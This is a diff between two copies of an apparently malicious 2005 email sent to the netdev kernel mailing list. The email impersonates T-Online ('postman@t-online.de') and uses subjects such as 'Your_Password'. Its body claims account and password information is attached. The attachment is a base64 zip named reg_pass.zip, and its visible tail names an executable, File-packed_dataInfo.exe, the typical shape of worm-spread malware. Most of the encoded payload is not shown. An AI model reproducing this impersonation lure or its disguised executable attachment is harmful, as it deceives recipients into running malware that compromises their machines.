@@ -1,26 +1,26 @@
 From: postman@t-online.de
-Subject: Registration_Confirmation
-Date: Fri, 16 Dec 2005 15:17:47 UTC
-Message-ID: <3551427f6ace09f5b7@t-online.de>
+Subject: Your_Password
+Date: Fri, 16 Dec 2005 17:11:40 UTC
+Message-ID: <58cf309fdf31254afbe@t-online.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=88d0c7e20d11"
+Content-Type: multipart/mixed; boundary="55eaf4ab.fc76cc0d12da"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: ralf@oss.sgi.com
+To: zfreemailer6596@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=88d0c7e20d11
+--55eaf4ab.fc76cc0d12da
 
 Account and Password Information are attached!
 
 
 ***** Go to: http://www.t-online.de
 ***** Email: postman@t-online.de
---=88d0c7e20d11
+--55eaf4ab.fc76cc0d12da
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=88d0c7e20d11--
+--55eaf4ab.fc76cc0d12da--
